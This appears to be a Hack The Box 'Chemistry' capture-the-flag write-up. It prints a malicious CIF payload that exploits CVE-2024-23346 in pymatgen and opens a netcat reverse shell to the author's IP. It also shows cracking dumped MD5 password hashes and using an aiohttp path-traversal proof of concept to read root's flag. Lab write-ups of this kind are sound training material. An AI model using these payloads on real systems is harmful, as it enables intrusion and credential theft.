<br><br>
**Platform : Hack The Box**
**Box : Chemistry**
**Difficulty : Easy**
**OS : Linux**

<br><br>

Our inital nmap scans reveals two ports open, 22 and 5000.
<br><br>
### `$ nmap -sVC --version-intensity 9 -p 22,5000 -Pn --disable-arp-ping -n chemistry -oN nmap/versions-scan.txt`

`Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org/) ) at 2024-10-22 23:37 CEST`  
`Nmap scan report for chemistry (10.10.11.38)`  
`Host is up (0.51s latency).`

`PORT STATE SERVICE VERSION`  
==`22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)`==  
==`5000/tcp open upnp?`==  
`| fingerprint-strings:`  
`| GetRequest:`  
`| HTTP/1.1 200 OK`  
`| Server: Werkzeug/3.0.3 Python/3.9.5`  
`| Date: Tue, 22 Oct 2024 21:37:54 GMT`  
`| Content-Type: text/html; charset=utf-8`  
`| Content-Length: 719`  
`| Vary: Cookie`  
`| Connection: close`  
`|`
`| class="title">Chemistry CIF Analyzer`  
`|`
`Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.

<---SNIP--->`


<br><br>
The application provided at port 5000 looks like a parser for *Crystallographic Information Files (CIF)*.
<br><br>
Chemistry - HTB - Easy/Pasted image 20241023002915.png<br><br>
Surfing the web we find the recent *CVE-2024-23346* 

https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0

A vulnerability in the parsing library *Pymatgen versions prior to 2024.2.8*, that executes arbitrary code via *insecure serializazion*.

All we need to do is craft a malicious .cif file, and then inject the command we want to execute in it. We have a template of the file's structure in the link above:

<br><br>

> *data_Example*
> *audit_creation_date            2018-06-08*
> *_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"*
> 
> *loop*
> *parent_propagation_vector.id*
> *_parent_propagation_vector.kxkykz*
> *k1 [0 0 0]*
> 
> *_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ()._class_._mro_[1]._getattribute_ ( *[().__class__.__mro__[1]]+["_sub" + "classes_"]) () if d._name_ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.15.56 1337 -e sh");0,0,0'*
> 
> 
> *_space_group_magn.number_BNS  62.448*
> *_space_group_magn.name_BNS  "P  n'  m  a'  "*
> 

<br><br>
Experimenting with an active handler and a series of bash payloads from https://www.revshells.com/, we find the right one to be:
<br><br>
> *busybox nc 10.10.15.56 1337 -e sh*

<br><br>

Which allows us to gain a reverse shell:

<br><br>

![[Pasted image 20241023004209.png]]

<br><br>

Checking the app's directory, we're able to retrieve the .db database that has stored all the *user's md5 hashes*, encoded with the following algorythm, as we can read in the *app.py* file.
<br><br>

>    hashed_password = hashlib.md5(password.encode()).hexdigest()

<br><br>
![[Pasted image 20241023010333.png]]

<br><br>

![[Pasted image 20241023010740.png]]

<br><br>

A rapid visit to https://crackstation.net reveals us the cleartext password of rosa's user:

<br><br>

![[Pasted image 20241102202421.png]]
<br><br>

This is our initial foothold on the machine. We have credentials to access ssh:

<br><br>

> *rosa:<ROSA'S_PASSWORD>*

<br><br>
Running linpeas.sh on the machine, we find out a *service listening on port 8080* of localhost
<br><br>

![[Pasted image 20241023012150.png]]
<br><br>
To enumerate this service, we perform an *SSH tunneling* to our host, using the following command:
<br><br>
`ssh -L 8080:localhost:8080 rosa@10.10.11.38`

<br><br>
This forwards *our localhost's* port 8080 to port 8080 running on 127.0.0.1 (localhost) remote machine.
A rapid nmap scan shows us that Chemistry is running *aiohttp 3.9.1*
<br><br>
![[Pasted image 20241102200205.png]]
<br><br>
and this is the first result if i search it on google:
<br><br>
https://github.com/z3rObyte/CVE-2024-23334-PoC
<br><br>
It looks like aiohttp software it is vulnerable to *path traversal* up to version *3.9.1*. We're going to modify a bit the script to make it run on *our* localhost's port 8080 and try to read *root's flag*. 

<br><br>
![[Pasted image 20241102200634.png]]
<br><br>

And...

<br><br>
![[Pasted image 20241102201153.png]]
<br><br>
Success! We have code execution as root user!
